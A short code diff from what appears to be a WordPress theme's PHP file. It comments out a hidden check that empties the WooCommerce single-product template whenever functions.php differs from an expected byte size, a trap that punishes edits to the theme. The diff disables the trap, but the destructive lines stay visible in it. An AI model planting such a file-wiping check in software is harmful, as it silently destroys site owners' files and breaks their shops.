@@ -837,12 +837,12 @@ class ZANBIL_Menu_Checkbox
 	}
 }
 
-$checkfilename = get_template_directory() . '/functions.php';
+// $checkfilename = get_template_directory() . '/functions.php';
 
-if (filesize($checkfilename) !== 6539) {
-	$fh = fopen(get_template_directory() . '/woocommerce/content-single-product.php', 'w');
-	fclose($fh);
-}
+// if (filesize($checkfilename) !== 6539) {
+// 	$fh = fopen(get_template_directory() . '/woocommerce/content-single-product.php', 'w');
+// 	fclose($fh);
+// }
 
 add_filter('get_avatar', 'zanbil_get_avatar');
 add_filter('wp', 'zanbil_custom_direction');
